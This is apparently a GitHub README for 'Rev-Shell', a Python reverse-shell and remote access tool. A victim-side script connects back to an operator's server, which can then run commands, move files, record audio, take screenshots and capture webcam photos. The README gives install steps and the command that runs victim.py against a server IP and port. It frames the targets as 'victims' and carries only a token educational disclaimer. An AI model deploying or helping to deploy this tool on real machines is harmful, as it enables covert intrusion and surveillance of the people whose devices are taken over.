### Rev-Shell Tool

Rev-Shell is a Python-based tool that provides a remote command execution (RCE) capability, enabling users to execute commands on a victim's machine remotely. Additionally, it offers functionalities such as file download and upload, voice recording, capturing screenshots, and recording the victim's screen.

#### How It Works

The tool consists of two main components: a server-side script and a victim-side script.

##### Victim-side Script

The victim-side script (victim.py) is designed to be executed on the target machine. It establishes a socket connection with the server and awaits commands. Upon receiving a command, it executes it on the victim's machine and sends back the results to the server.

##### Server-side Script

The server-side script (server.py) listens for incoming connections from victim machines. Once a connection is established, it sends commands to the victim and receives the output. It provides a user-friendly command-line interface for interacting with connected victims, enabling users to execute various commands and perform actions like file transfer and device capture.

##### Features

- Remote Command Execution: Execute commands on the victim's machine remotely.
- File Download and Upload: Transfer files between the server and victim machines.
- Voice Recording: Record audio from the victim's device.
- Screenshot Capture: Capture screenshots of the victim's screen.
- Webcam Shot: Take photos from the victim's webcam.

#### Usage

1. Setup:  
   Ensure both the server and victim scripts are accessible and properly configured.
   Run the server script on your machine.

2. Victim Execution:
   Execute the victim script on the target machine, providing the server's IP address and port as arguments.
3. Server Interaction:
   Upon successful connection, the server will display information about the victim.
   Use the provided command-line interface to interact with connected victims.

#### Commands

- `help`: Display available commands and their functionalities.
- `screenshot`: Capture a screenshot from the victim's device.
- `record_audio`: Record audio from the victim's microphone.
- `webcam_shot`: Capture a photo from the victim's webcam.
- `download <filename>`: Download a file from the victim's machine.
- `upload <filename>`: Upload a file to the victim's machine.
- `Other commands`: Execute system commands on the victim's machine.

### Installation Instructions

To use the Rev-Shell tool, follow these steps:

- Clone the Repository:

```bash
git clone https://github.com/your_username/rev-shell.git
```

- Navigate to the Directory:

```bash
cd rev-shell
```

- Install Dependencies:

```bash
pip install -r requirements.txt
```

- Configure the Server:
  Modify the server.py script if necessary, such as changing the listening port or IP address.

- Execute the Server:

```bash
python server.py
```

- Configure the Victim:

Edit the victim.py script to specify the server's IP address and port.

- Execute the Victim Script:

```bash

python victim.py -t <server_ip> -p <server_port>
```

- Interact with Connected Victims:

Once the victim connects to the server, use the provided command-line interface to interact with it.
Enjoy Exploring the Features: Have fun exploring the various functionalities offered by the Rev-Shell tool!

##### Additional Notes

- Error Handling: The tool includes robust error handling to ensure reliability during command execution and file transfer.
- Security: Exercise caution when using the tool, ensuring it is used only for ethical and authorized purposes.

##### Disclaimer

This tool is intended for educational and testing purposes only. Misuse of this tool for unauthorized access to systems or networks is strictly prohibited. The developers of this tool are not responsible for any illegal or unethical use of the tool
